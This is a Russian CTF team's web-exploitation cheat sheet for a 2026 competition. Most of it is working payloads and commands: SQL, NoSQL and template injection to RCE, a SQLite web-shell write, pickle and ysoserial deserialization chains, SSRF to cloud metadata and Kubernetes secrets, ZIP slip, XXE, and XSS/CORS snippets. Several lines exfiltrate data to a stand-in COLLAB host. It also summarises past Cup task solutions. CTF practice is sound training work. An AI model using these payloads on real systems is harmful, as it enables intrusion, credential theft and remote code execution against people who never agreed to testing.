# Web — шпаргалка к X Кубку CTF России 2026
Рабочий документ команды. `$T` — `host:port`, `$U` — полный URL (`http://$T`). Всё, что не проверено на конкретном таске, — гипотеза; фиксируй результат в таблице тасков.

## Когда открывать
- Дали HTTP/HTTPS, домен, «маркетплейс», «форум», «CRM», «сканер», «конвертер PDF».
- Есть бот/админ, который ходит по присланным ссылкам: XSS, CSRF, SSRF, open redirect.
- Загружаются файлы, архивы, картинки, документы: upload bypass, ZIP slip, XXE, десериализация.
- API на JSON/GraphQL, JWT, OAuth, «личный кабинет», «оплата», «восстановление пароля».
- Сервис сам ходит по URL: PDF/screenshot, webhook, импорт, прокси картинок, «проверить сайт».
- В AD-раунде нужен аудит чужого сервиса и быстрый патч — см. `ad.md`.

## Карта раздела
1. Разведка. 2. Инъекции. 3. Auth/доступ. 4. SSRF. 5. Файлы. 6. Десериализация. 7. Client-side. 8. Прочее. 9. Кубок 2022–2025. 10. Чек-лист и грабли.

## 0. Разведка за 5 минут
```bash
whatweb -a 3 $U; httpx -u $U -title -tech-detect -status-code -web-server -cdn -follow-redirects
nmap -sV -Pn -p- --min-rate 2000 $T
curl -sik $U | sed -n '1,40p'      # заголовки, cookie, редиректы, фреймворк
curl -s $U/robots.txt $U/sitemap.xml $U/.well-known/security.txt
```

```bash
ffuf -u $U/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -mc all -fc 404 -fs 0 -t 50 -o ffuf.json
feroxbuster -u $U -x php,html,js,json,txt,bak,old,zip,tar.gz -d 3 -t 50 --smart
katana -u $U -jc -d 3 -kf all -o urls.txt
nuclei -u $U -severity critical,high,medium -tags cve,exposure,misconfig,default-login -o nuclei.txt
```

- Burp: Scope → Proxy → Repeater; Intruder для перебора; Collaborator для blind SSRF/XSS; JWT Editor; Param Miner для скрытых параметров.
- Проверь `OPTIONS`, `TRACE`, методы `PUT/DELETE/PATCH`, `X-HTTP-Method-Override`.
- Ошибки/404/500 часто отдают стек, версии, путь к приложению, иногда флаг.
- Заголовки `Server`, `X-Powered-By`, `Set-Cookie` (`session`, `connect.sid`, `PHPSESSID`, `laravel_session`) сразу говорят о стеке.

### JS и source maps
```bash
curl -s $U | grep -Eo 'src="[^"]+\.js[^"]*"' | cut -d'"' -f2 | sort -u
curl -s $U/static/app.js | grep -Eo '(https?://[^"'\'' ]+|/api/[A-Za-z0-9_/{}.$-]+)' | sort -u
curl -s $U/static/app.js | grep -Eo 'sourceMappingURL=[^ ]+'
python3 linkfinder.py -i $U/static/app.js -o cli; sourcemapper -url $U/static/app.js.map -output js_src/
```

- Ищи `api_key`, `secret`, `token`, `Bearer`, `AKIA`, `-----BEGIN`, `admin`, `debug`, `internal`, `staging`.
- В webpack/Vite смотри chunk-имена, `__NEXT_DATA__`, `window.__INITIAL_STATE__`, `import.meta.env`.
- `.js.map` часто содержит полный исходник с комментариями и скрытыми эндпоинтами.
- Секретный эндпоинт из закомментированного кода — классика (babyweb 2025: `/purchase-details?secret=premium`).

### Git, backup, конфиги
```bash
curl -s $U/.git/HEAD; curl -s $U/.git/config; curl -s $U/.git/index
git-dumper $U/.git/ git_out/ && cd git_out && git log -p --all
```

- Backup: `index.php.bak`, `.old`, `.orig`, `.save`, `.swp`, `~`, `.zip`, `.tar.gz`, `.sql`, `.env`, `.DS_Store`, `docker-compose.yml`, `Dockerfile`, `phpinfo.php`, `server-status`.
- Swagger: `/swagger.json`, `/openapi.json`, `/api-docs`, `/graphql` (introspection), `/actuator`, `/debug`.
- Git history — первый источник паролей и старых уязвимых версий: `git log -S 'password' -p`.

## 1. Инъекции
### SQLi
```sql
'  ''  `  ')  '))  ' OR 1=1-- -  ' OR '1'='1  '||'1'||'
' AND 1=1-- -   ' AND 1=2-- -
1 AND SLEEP(3)   1;WAITFOR DELAY '0:0:3'--
```

| СУБД | Фингерпринт | Файл/команда |
|---|---|---|
| MySQL | `version()`, `@@version`, `database()`, `user()` | `LOAD_FILE('/flag')`, `INTO OUTFILE '/var/www/html/s.php'` |
| PostgreSQL | `version()`, `current_database()`, `pg_sleep(3)` | `COPY (SELECT '') TO PROGRAM 'id'` |
| SQLite | `sqlite_version()`, `sqlite_master` | `ATTACH DATABASE '/var/www/html/s.php' AS x` |
| MSSQL | `@@version`, `WAITFOR DELAY` | `xp_cmdshell`, `OPENROWSET` |
| Oracle | `v$version`, `dbms_pipe.receive_message` | `UTL_HTTP`, `DBMS_XSLPROCESSOR` |

```sql
' ORDER BY 1-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,version(),database()-- -
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables-- -
```

Обход WAF:

```text
/**/UNION/**/SELECT          /*!50000UNION*/ /*!50000SELECT*/
UNION%0aSELECT               %55NION %53ELECT
' /*!or*/ 1=1-- -            '+UNION+SELECT+1,2--
```

- `;` как разделитель параметров: `?id=1;password=' OR 1=1-- -` — Go < 1.17 видит `password`, nginx/Lua нет (warmup 2022).
- Два заголовка `Content-Type` ломают проверку тела WAF, PHP при этом выбирает понятный ему тип (waf 2023).
- `--` требует пробела/`+`; MySQL также понимает `#` (`%23`).

```bash
sqlmap -r req.txt -p id --batch --level=5 --risk=3 --threads 10 \
  --technique=BEUST --tamper=space2comment,between,randomcase,charencode
sqlmap -r req.txt -p id --dbms=sqlite --sql-query "select * from books"
sqlmap -r req.txt -p id --file-read=/flag --file-write=shell.php --file-dest=/var/www/html/shell.php
```

SQLite → PHP-shell:

```sql
'; ATTACH DATABASE '/var/www/html/lol.php' AS lol; CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn VALUES ('<?php echo system($_GET["a"]); ?>'); --
```

- Second-order: значение из БД снова попадает в запрос; проверяй смену пароля/профиля.
- ORM: `whereRaw`, `orderBy` с пользовательским полем, `JSON_EXTRACT`, `LIKE` с `%`.

### NoSQLi (MongoDB)
```json
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":"admin","password":{"$regex":"^.*"}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"$where":"sleep(3000)"}
{"$where":"this.password.match(/^a/)"}
```

```http
POST /login
Content-Type: application/x-www-form-urlencoded

username[$ne]=x&password[$ne]=x
```

- Blind regex: `{"content":{"$regex":"^ctfcup\\{"}}`; алфавит `0-9a-zA-Z_{}-`, экранируй `{` и `}`.
- Операторы: `$ne`, `$gt`, `$gte`, `$in`, `$nin`, `$exists`, `$regex`, `$where`, `$expr`, `$jsonSchema`.
- `$where` исполняет JS: `sleep(5000)`, `while(true){}` — time-based oracle.
- Массив/объект вместо строки: `username[$regex]=^admin`, `password[$ne]=1`.

Кейс goose 2025: `SECRET_KEY="kluchik"` в исходниках + `find(dict(session.items()))`. Форжим Flask-cookie с `content: {"$regex": "^ctfcup{"}`; `/strings` возвращает `error`, если regex совпал, — побитовое извлечение флага. Локальная заглушка из `solve/server.py` подписывает cookie тем же ключом.

### SSTI
```text
${7*7}  {{7*7}}  #{7*7}  <%= 7*7 %>  ${{7*7}}  @(7*7)
```

```jinja2
{{7*'7'}}                                  # Jinja2 → 7777777, Twig → 49
{{config}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.mro()[1].__subclasses__()[INDEX]('/flag').read()}}
```

```text
Twig:  {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
Twig:  {{['cat /flag']|map('system')|join}}
FreeMarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
ERB:   <%= global.process.mainModule.require('child_process').execSync('cat /flag') %>
```

- Фильтры обхода: `attr`, `|join`, `{% set %}`, `request|attr('application')`, `\x5f\x5fclass\x5f\x5f`, `[].__class__`.
- Blind: `{{7*7}}` в поле, которое потом рендерится в PDF/письме; time-based через `os.popen('sleep 5')`.
- Инструменты: `tplmap -u "$U/?name=*" --os-shell`, `SSTImap`.

### Command injection
```text
; id    | id    || id    && id    $(id)    `id`    %0a id    %0d%0a id
```

- Blind: `; sleep 5`, `; curl http://COLLAB/$(whoami)`, DNS: `; nslookup $(cat /flag).COLLAB`.
- Аргументная инъекция: `--output=/var/www/html/s.php`, `-o`, `--config`, `git --upload-pack=`, `tar --checkpoint-action=exec=sh`.
- Обход: `${IFS}`, `$@`, `$'\x73\x68'`, `who$@ami`, wildcard `/???/??n`, `echo BASE64|base64 -d|sh`.
- Проверь, не склеивается ли команда из нескольких полей; иногда `;` фильтруется, а `%0a` — нет.

### LDAP и XPath
```text
*)(uid=*))(|(uid=*        admin*        *)(objectClass=*        )(&(uid=*)(userPassword=*)
```

- Blind: `*)(uid=admin)(|(password=a*` — побитовый перебор.
- Кодируй `*` как `%2a`, `(` как `%28`, `\` как `%5c`; пробуй `%00`.
- XPath: `' or '1'='1`, `']|//*|//*['`, `count(//*)`, `substring(//user[1]/pass,1,1)='a'`.

## 2. Auth и доступ
### JWT
```bash
cut -d. -f1 token | base64 -d 2>/dev/null; cut -d. -f2 token | base64 -d 2>/dev/null
jwt_tool token -M at -t $U/admin; jwt_tool token -C -d /usr/share/wordlists/rockyou.txt
hashcat -m 16500 token jwt.txt
```

- `alg:none`: `{"alg":"none","typ":"JWT"}` + пустая подпись; пробуй `None`, `NONE`, `nOnE`.
- Confusion RS256→HS256: подписываем публичным ключом сервера (TLS-сертификат, `/auth/public-key`) как HMAC-секретом.

```python
import jwt
pub = open("cert.pem").read()          # или JSON {"public_key": "..."}
print(jwt.encode({"sub": "admin", "role": "admin"}, pub, algorithm="HS256"))
```

- `kid`: path traversal/SQLi/command — `"kid":"../../../../dev/null"`, `"kid":"/proc/self/environ"`, `"kid":"x' UNION SELECT 'secret'-- -"`.
- `jwk`/`jku`/`x5u`: подставляем свой JWK или URL на свой ключ; проверь SSRF и доверие к `jku`.
- Слабый HS256: `jwt-cracker`, `hashcat -m 16500`; пустой секрет.
- Логика: `sub`, `role`, `is_admin`, `email_verified`, `exp`/`nbf`, `aud`; расхождения парсеров (dup keys, `alg` в payload).

### OAuth/OIDC
- `redirect_uri`: `https://evil@target/cb`, `//evil`, `https://target.evil`, `?next=`, `#`, `%2f`, `%252f`, open redirect в `/logout`.
- Нет `state` → CSRF на привязку аккаунта; `nonce` не проверяется → replay `id_token`.
- PKCE downgrade: убрать `code_challenge`, `plain` вместо `S256`; `response_mode=form_post` + утечка в Referer.
- `id_token` с `alg:none` или HS256; `aud`/`iss` не проверяются; `email` без `email_verified`.
- Account linking по email → регистрируем `victim@example.com` раньше жертвы; `client_secret` в JS; `implicit` flow.

### Сессии
```bash
flask-unsign --decode --cookie "$COOKIE"
flask-unsign --sign --cookie "{'user_id':'1','role':'admin'}" --secret 'kluchik'
```

- Фиксация: cookie не меняется после логина; `Set-Cookie` без `HttpOnly/Secure/SameSite`.
- Flask `SECRET_KEY` из исходников/`.env` → форж сессии (goose); Django `SECRET_KEY` → `django.core.signing`; Laravel `APP_KEY` → `laravel-crypto-killer`.
- Session puzzle: подписанный объект, но поля влияют на SQL/Mongo/шаблон; cookie tossing с поддомена; `__Host-`/`__Secure-` не соблюдаются.

### IDOR и mass assignment
- Меняй числовые ID, UUID, slug, `user_id`, `owner_id`, `bill_id`, `payment_id`, `tenant_id`.
- Пробуй `?id=1` → `?id=1,2`, `id[]=1`, JSON-массив, GraphQL `node(id:)`, batch-эндпоинты.
- Методы: `GET /bill/1` закрыт, `POST /bill/1`, `PUT`, `HEAD`, `OPTIONS` — часто нет проверки.
- Mass assignment: добавь `is_admin`, `role`, `balance`, `price`, `discount`, `verified`, `owner_id`, `permissions`.
- Дублирующиеся ключи JSON: `{"role":"user","role":"admin"}` — разные парсеры берут разные.
- Path normalization: `/admin/..;/`, `//admin`, `/%2e/admin`, `/admin%2f`, `/admin.`, регистр.

### Race conditions
- Купоны, вывод средств, лайки, голоса, повторная оплата, активация trial.
- Отправляй 20–50 одинаковых запросов одновременно; Turbo Intruder `gate`/last-byte sync, `xargs -P 50`.
- Проверяй идемпотентность: два `POST /bill/pay` могут списать дважды или выдать два товара.
- Окно между проверкой баланса и списанием (veladora: `SELECT balance` → `UPDATE` в транзакции, но без `FOR UPDATE`).

### Password reset и 2FA
- Сброс: `Host: evil`, `X-Forwarded-Host: evil`, ссылка с токеном уходит на наш домен; токен в Referer.
- Токен предсказуем (timestamp, md5(email), короткий), не инвалидируется, переиспользуется.
- Парсер email: `victim@target.com@evil.com`, `"victim"@evil.com`, юникод-точки.
- 2FA: пропустить шаг `/verify` → сразу `/profile`; ответ `{"ok":false}` заменить на `true`; OTP без rate limit; backup-код; reuse; `otp[]=`.
- Сброс 2FA через reset password; смена email без подтверждения; remember-me cookie.

## 3. SSRF
```text
http://127.0.0.1:80       http://127.0.0.1:6379       http://localhost:8080/admin
http://2130706433/        http://0x7f000001/         http://0177.0.0.1/
http://127.1/             http://[::1]/              http://[::ffff:127.0.0.1]/
```

- DNS rebinding: `1u.ms`, `nip.io`, `sslip.io`, `xip.io`; сначала отвечает внешним IP, потом `127.0.0.1`.
- Redirect: свой сервер отдаёт `302 Location: http://169.254.169.254/...`; проверь, следует ли клиент.
- Обход: `http://expected@evil`, `http://evil#@expected`, `http://evil\\@expected`, `%2f`, `%00`, Unicode, `//evil`.
- Схемы: `file:///flag`, `gopher://`, `dict://`, `ftp://`, `ldap://`, `unix:///var/run/docker.sock`.

### Metadata и внутренние сервисы
```bash
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/user-data
curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/
curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'
curl -s http://169.254.169.254/metadata/v1/            # DigitalOcean
curl -sk https://kubernetes.default.svc/api/v1/namespaces/default/secrets \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
```

- Docker socket: `http://localhost:2375/containers/json`, `unix:///var/run/docker.sock`.
- Redis: `gopher://127.0.0.1:6379/_...`; HTTP-запрос к Redis тоже работает, если клиент не нормализует метод/заголовки.
- FastCGI: `gopher://127.0.0.1:9000/_...`; MySQL: `gopher://127.0.0.1:3306/_...`.
- Внутренние админки: `/admin`, `/actuator/env`, `/metrics`, `/debug/pprof`, `/api/internal`.

### Headless PDF/Chromium (trustmebroker 2025)
- HTML→PDF через Puppeteer: `<iframe src="http://admin:9090/...">`, `<img>`, `<link>`, `<object>`, `<embed>`, CSS `url()`, `<meta http-equiv=refresh>`.
- JS выключен, `file:` абортится — значит нужен именно сетевой SSRF и чтение ответа через PDF.
- Фильтр вырезает `< > " ' \` и режет значение до 17 символов; обход — рекурсивная сборка тега из нескольких JSON-полей.

```json
{"h1":"xn | * src=xz:xc","xz":"http://admin","xc":"9090/agreements$","xn":"iframe",
 "|":"width=700","*":"height=2000","$":"?page=1",
 "firstname":"1","middlename":"2","birthdate":"2012-12-12","email":"a@a.ru",
 "passport_series":"1","passport_number":"1","passport_issued_by":"2",
 "passport_issued_date":"2012-12-12","address":"1","agree":"1","lastname":"e"}
```

- `map[string]string` на `/register/step2` позволяет добавить произвольные ключи; `sanitize` применяется к каждому значению, но не к структуре.
- После SSRF в админку: `/agreements?page=1`, берём `agreement_id` первой записи и подставляем в cookie на `/agreement` — флаг.
- Проверяй также `<base href>`, `<form action>`, SVG `<image href>`, `<video poster>`, `<input type=image src>`.

## 4. Файлы
### LFI/RFI и wrappers
```text
?file=../../../../etc/passwd          ?file=....//....//etc/passwd
?file=%2e%2e%2f%2e%2e%2fetc/passwd   ?file=%252e%252e%252fetc/passwd
?file=/etc/passwd%00.png              ?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php
?file=http://COLLAB/shell.txt        # RFI, нужен allow_url_include=On
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
?file=php://input                     # POST: <?php system($_GET['c']); ?>
?file=zip:///tmp/x.zip%23shell.php    ?file=phar:///tmp/x.phar
?file=/proc/self/environ              ?file=/proc/self/fd/2
```

- Log poisoning: в `User-Agent`/`Referer` пишем `<?php system($_GET['c']); ?>`, затем LFI на `access.log`, `error.log`, `auth.log`.
- Сессии: `/var/lib/php/sessions/sess_<PHPSESSID>`, `/tmp/sess_*`.
- `php://filter` chain с iconv → RCE (php_filter_chain_generator).
- `phar://` триггерит десериализацию метаданных даже без `unserialize`.

### Path traversal
```text
../../etc/passwd            ..%2f..%2fetc%2fpasswd       ..%252f..%252fetc%252fpasswd
..%5c..%5cwindows%5cwin.ini ....//....//etc/passwd        /var/www/html/../../../../flag
```

- Абсолютный путь часто побеждает `filepath.Join`; `Clean` не спасает от symlink.
- Windows: `..\`, `%5c`, `C:\`, ADS `file.php::$DATA`, trailing dot/space.
- Проверь скачивание по имени: `?name=../../flag`, `?name=/flag`, `?name=....//flag`.

### Upload
- Расширения: `.php`, `.php3/.php5/.phtml/.phar`, `.htaccess`, `.user.ini`, `.shtml`, `.jsp`, `.aspx`.
- Двойное: `x.php.jpg`, `x.jpg.php`, `x.php%00.jpg`, `x.php.`, `x.php `, `x.PHP`.
- Content-Type и magic bytes: `GIF89a;<?php ...`, polyglot JPEG/PHP; проверь, что реально исполняется.
- `.htaccess`: `AddType application/x-httpd-php .jpg`; `.user.ini`: `auto_prepend_file=shell.jpg`.
- Path traversal в имени файла: `../../../../var/www/html/shell.php`.
- Race: загрузить `.php` → проверка/удаление → запрос до удаления.
- Пережатие картинки убивает payload; тогда ищи metadata/EXIF, SVG, ZIP с PHP, либо обход через `phar`.

### ZIP slip / archive
```python
import zipfile
z = zipfile.ZipFile("evil.zip", "w")
z.writestr("../../../../var/www/html/shell.php", "<?php system($_GET['c']); ?>")
z.close()
```

- Symlink-запись в архиве → чтение/запись вне каталога.
- `tar`: `--absolute-names`, `../`, hardlink; проверь распаковку от root.
- Архив может содержать `../` в имени, но приложение чистит только начало — пробуй `....//`, `..%2f`.

### XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY e SYSTEM "file:///flag">]>
<x>&e;</x>
```

```xml
<!DOCTYPE x [<!ENTITY % p SYSTEM "http://COLLAB/dtd">%p;]>
```

- OOB: параметрические сущности + внешний DTD; exfil через `http://COLLAB/?%file;`.
- Точки входа: SOAP, SVG, DOCX/XLSX, RSS, SAML, `Content-Type: application/xml`.
- PHP wrapper: `php://filter/convert.base64-encode/resource=/flag` внутри `SYSTEM`.
- Слепой XXE: ошибка парсера/время; проверь `expect://id`.

## 5. Десериализация
| Стек | Признак | Инструмент/пейлоад |
|---|---|---|
| PHP | `O:4:"User":...`, `a:2:{...}` | `phpggc`, `phar://` |
| Python | base64 `gASV`, `pickle.loads` | `__reduce__`, `os.system` |
| Java | `rO0AB`, `AC ED 00 05` | `ysoserial`, `marshalsec` |
| Node | `_$$ND_FUNC$$_` | `node-serialize` |
| .NET | `AAEAAAD/////` | `ysoserial.net`, `BinaryFormatter` |

```php
O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"admin";b:1;}
```

```bash
phpggc Laravel/RCE9 system 'cat /flag' -b
phpggc -p phar Monolog/RCE1 system 'id' -o evil.phar
```

```python
import pickle, os, base64
class E:
    def __reduce__(self):
        return (os.system, ("cat /flag",))
print(base64.b64encode(pickle.dumps(E())).decode())
```

```yaml
!!python/object/apply:os.system ["cat /flag"]
```

```bash
java -jar ysoserial.jar CommonsCollections6 'cat /flag' | base64 -w0
java -jar ysoserial.jar URLDNS 'http://COLLAB'      # только детект
```

- PHP magic: `__wakeup`, `__destruct`, `__toString`, `__call`, `__invoke`, `__set_state`; pop-chain из установленных библиотек.
- Java: `ObjectInputStream.readObject`, `TemplatesImpl`, `JdbcRowSetImpl` (JNDI), `BadAttributeValueExpException`.
- JNDI/Log4Shell: `${jndi:ldap://COLLAB/a}`; проверь `marshalsec` + `JNDIExploit`.
- Node: `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}`.
- .NET: `TypeConfuseDelegate`, `ObjectDataProvider`, `ActivitySurrogateSelector`; ViewState с известным `machineKey`.
- Защита: подпись/шифрование блоба, allowlist классов, отказ от native-форматов.

## 6. Client-side
### XSS
```html
<img src=x onerror=alert(1)>          <svg onload=alert(1)>
"><script>alert(1)</script>           '><img src=x onerror=alert(1)>
javascript:alert(1)                   <iframe srcdoc="<script>alert(1)</script>">
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
```

- Контексты: HTML, атрибут, JS-строка, URL, CSS, JSON внутри `<script>`, шаблон.
- DOM: `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML`, `eval`, `setTimeout(string)`, `location`, jQuery `.html()`, Angular `ng-bind-html`.
- DOM clobbering: `<img name=config>`, `<form id=x><input name=action>`; mutation XSS.
- Обход фильтров: `<svg/onload>`, `<img src=x onerror=...>`, `%3C`, Unicode, `onpointerover`, `<details open ontoggle>`.

### CSP bypass
- Ищи страницы без CSP: 404/500, `/api/*`, редиректы (novosti 2023: `iframe.src="/404"` без заголовка).
- `script-src 'self'`: загрузка своего JS на тот же origin (upload, JSONP, `/static`), `base-uri`.
- `'unsafe-inline'`: обычный inline; `nonce`: reuse/leak из DOM; `strict-dynamic`: gadget в whitelisted библиотеке.
- Whitelisted CDN: Angular/Vue/React gadgets, JSONP (`callback=alert`), `google.com/recaptcha`.
- `data:`/`blob:`/`filesystem:` в `script-src`; `frame-src` + `srcdoc`; `object-src`.
- CSP report-only → всё равно исполняется; проверь `Content-Security-Policy-Report-Only`.

### CSRF
```html
<form action="http://target/profile" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil","x":"' value='"}'>
</form>
<script>document.forms[0].submit()</script>
```

- Токен проверяется только на `POST`, а `HEAD`/`GET` меняет состояние (onlytweets 2022: `HEAD /share?tweet_id=1&to_user=me`).
- `request.values` / `$_REQUEST` берут параметры из URL; method override `_method=POST`.
- `SameSite=Lax` не спасает для GET-переходов; `SameSite=None` без `Secure`.
- Токен не привязан к сессии, не ротируется, проверяется по длине, принимается пустой.
- Login CSRF, OAuth CSRF (`state`), JSON CSRF через `text/plain`.

### CORS
```html
<script>
fetch("http://target/api/me", {credentials: "include"})
  .then(r => r.text()).then(t => location = "http://COLLAB/?" + btoa(t));
</script>
```

```http
Origin: https://evil.com
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

- `Origin: null` (sandbox iframe, `data:`) и отражение любого origin.
- Доверие к поддомену/`*.target.com`; проверь `document.domain`.
- `Access-Control-Allow-Origin: *` + credentials — браузер отклонит, но токен всё равно утечёт без credentials.
- Preflight обходят простые запросы: `text/plain`, `GET`, `POST` с form-urlencoded.

### Prototype pollution, postMessage
```json
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}
```

```text
?__proto__[isAdmin]=true          ?constructor[prototype][isAdmin]=true
```

- Клиент: merge/extend/`Object.assign`/`JSON.parse` reviver; gadget → XSS (`srcdoc`, `innerHTML`, `script.src`).
- Сервер Node: pollution → RCE через `child_process`, `require`, `EJS`/`Handlebars` gadgets.
- postMessage: нет `event.origin`, `*`, `eval(event.data)`, `window.open` + `window.name` (mistakes 2023: имя `__proto__` → pollution → `srcdoc`).
- `window.name` живёт между навигациями; `window.open(url, "__proto__")`.

## 7. Прочее
### CRLF и header injection
```text
%0d%0aSet-Cookie:admin=1      %0d%0aLocation:http://COLLAB      %0aX-Injected:1
```

- Точки: `Location`, `Set-Cookie`, `Content-Disposition`, имя пользователя в письме, `Referer`.
- Response splitting → cache poisoning, XSS, фиксация cookie.
- В scanner 2023 CRLF в `version` (aiohttp принимает список строк) → запись в Redis до `Host:`.

### Request smuggling
```http
POST / HTTP/1.1
Host: target
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

- CL.TE, TE.CL, TE.TE (`Transfer-Encoding: xchunked`, `chunked, identity`, obfuscation).
- HTTP/2 downgrade: `:path` с CRLF, `content-length` дубли, `transfer-encoding` в h2.
- Детект по таймингу/расхождению ответов; `smuggler`, `http2smugl`, Turbo Intruder.
- Импакт: обход auth, отравление очереди, кража чужого запроса/ответа.

### Cache poisoning / deception
- Unkeyed headers: `X-Forwarded-Host`, `X-Host`, `X-Original-URL`, `X-Rewrite-URL`, `Forwarded`.
- Отравление: `X-Forwarded-Host: evil` → ссылка в HTML/JS кэшируется для всех.
- Web cache deception: `/account/profile.css`, `/account;.css`, `/account%2f.css` — CDN кэширует приватное.
- `Vary`, `Cache-Control: public`, cookie не в ключе; проверь `Age`, `X-Cache`, `CF-Cache-Status`.
- Fat GET: параметры в теле GET-запроса, WAF их не видит.

### HTTP/2 и WebSocket
- h2c upgrade, `:authority` vs `Host`, `:path` с `%0d%0a`, HPACK-инъекции.
- WebSocket: handshake без `Origin`, CSRF через `new WebSocket` (cookies отправляются), сообщения без authz.
- `websocat -v ws://$T/ws`, Burp WebSocket; проверь подписку на чужие каналы, IDOR в сообщениях.

## 8. Web в Кубке 2022–2025
| Год | Задача | Уязвимость | Payload/ключ |
|---|---|---|---|
| 2025 | babyweb | Доверие `X-Forwarded-For` + комментарии в JS | `X-Forwarded-For: 185.220.101.1` → EUR/CHF, цена 699.99/93 < 100; `/purchase-details?secret=premium` |
| 2025 | goose | Hardcoded `SECRET_KEY`, NoSQL-инъекция через session | `SECRET_KEY="kluchik"`, cookie `{"content":{"$regex":"^ctfcup{"}}`, `/strings` → error-oracle |
| 2025 | goose-revenge | То же, но `user_id` случайный, все поля `str()` | Тот же regex-oracle; флаг не привязан к `user_id=0` |
| 2025 | trustmebroker | SSRF в Puppeteer + обход HTML-фильтра | `map[string]string` на `/register/step2`; поля-фрагменты `iframe src=http://admin:9090/agreements?page=1`; cookie `agreement_id` |
| 2023 | mistakes | Prototype pollution через `window.name` + postMessage | `window.open('/post','__proto__')`; `postMessage({status:"ERROR",requestType:"Slonser",data:{debugUrl:"http://evil/#"}},'*')`; `srcdoc` |
| 2023 | novosti | XSS + CSP отсутствует на 404 | `iframe.src="/404"`; `iframe.contentWindow.document.body.innerHTML='<img src=x onerror=...>'`; `fetch("http://files:8080/flag")` |
| 2023 | scanner | SSRF + CRLF → Redis → Celery RCE | `{"url":"http://localhost:6379","version":["\r\nSET celery-task-meta-<uid> '<json>'\r\n","1"]}`; `InvalidHostException` |
| 2023 | waf | Два `Content-Type` ломают WAF; SQLi → RCE | `Content-Type: application/json` + `application/xml`; `name=a' OR 1=1; DROP TABLE users; --`; `ATTACH DATABASE '/var/www/html/lol.php'` |
| 2022 | legacy | Header injection в CGI auth + redirect | username `x\r\nLocation: https://webhook/...`; утечка `AUTH_KEY`; cookie `lsession=admin.<sha1(key|user|key)>` |
| 2022 | onlytweets | CSRF через `HEAD` + `request.values` | `fetch('http://backend:4321/share?tweet_id=1&to_user=me',{method:'HEAD',credentials:'include'})` |
| 2022 | simple | JWT RS256→HS256 | Подписать публичным ключом TLS: `jwt.encode({...}, cert_pem, algorithm='HS256')` |
| 2022 | warmup | SQLi + WAF bypass через `;` | `?secretId=-1;password=-1" UNION ALL SELECT LOAD_FILE('/mysqlpwd') -- ` |

## 9. Чек-лист «30 минут на веб-таск»
| Минуты | Действие |
|---|---|
| 0–3 | `whatweb`, `httpx`, заголовки, robots, JS-файлы, `/.git/`, backup. Записать стек и входные точки. |
| 3–8 | Burp: пройти все формы/API, собрать эндпоинты, роли, cookie, JWT. Отметить админ-функции и бота. |
| 8–15 | Быстрые классы: SQLi `'`, NoSQL `$ne`, SSTI `{{7*7}}`, LFI `../../`, SSRF `http://127.0.0.1`, IDOR (два аккаунта), upload. |
| 15–22 | Углубить 1–2 перспективных: sqlmap/ручные payload, JWT, SSRF→metadata, XSS→бот, race. |
| 22–28 | Собрать цепочку до флага; проверить, что флаг читается, а не только «200 OK». |
| 28–30 | Зафиксировать payload, ограничения, что не сработало; сохранить скрипт и вывод. |

Сигнал → первый шаг:

| Сигнал | Что пробовать |
|---|---|
| `?id=`, `?file=`, `?page=` | SQLi, LFI, path traversal, IDOR |
| JSON-тело, Mongo/Express | NoSQLi `$ne/$regex`, mass assignment, prototype pollution |
| PDF/screenshot/webhook/import | SSRF, metadata, gopher, headless Chromium |
| JWT в cookie/header | `none`, HS256 confusion, `kid`, `jku` |
| Бот/«пожаловаться» | XSS, CSRF, postMessage, open redirect |
| Загрузка файла | extension bypass, .htaccess, ZIP slip, XXE, phar |
| «Админка» | IDOR, forced browsing, method override, mass assignment |

## 10. Типовые грабли
- **WAF 403.** Меняй кодировку (`%27`, `%2527`, Unicode), регистр, комментарии, `--` на `#`, тело на JSON, два `Content-Type`, HTTP/2, chunked. Проверь, не блокируется ли сам `curl` по User-Agent.
- **Кодировки.** Go/PHP/nginx по-разному парсят `;`, `%00`, `+`, повторяющиеся параметры. Пробуй `--path-as-is`, `--raw`, двойное кодирование, Latin-1, overlong UTF-8.
- **Таймзоны.** JWT `exp/nbf` — UTC; TOTP — 30-секундное окно; SQL `NOW()` может быть в другой зоне; race-окно измеряй в UTC.
- **Флаг в исходниках.** `grep -RInE 'ctfcup|CTFCup|CUP\{' .`; JS source maps, git history, `.env`, `docker-compose`, `Dockerfile`, `strings` бинарей, `/proc/1/environ`, логи, тесты, backup.
- **Флаг в ответе, но не тот.** Проверь формат (регистр, `{}`, префикс), не является ли это примером/заглушкой; ищи второй флаг в БД/файле.
- **Cookie не отправляется.** `Secure` на HTTP, `Domain`, `Path`, `SameSite`; используй `curl -b` вручную.
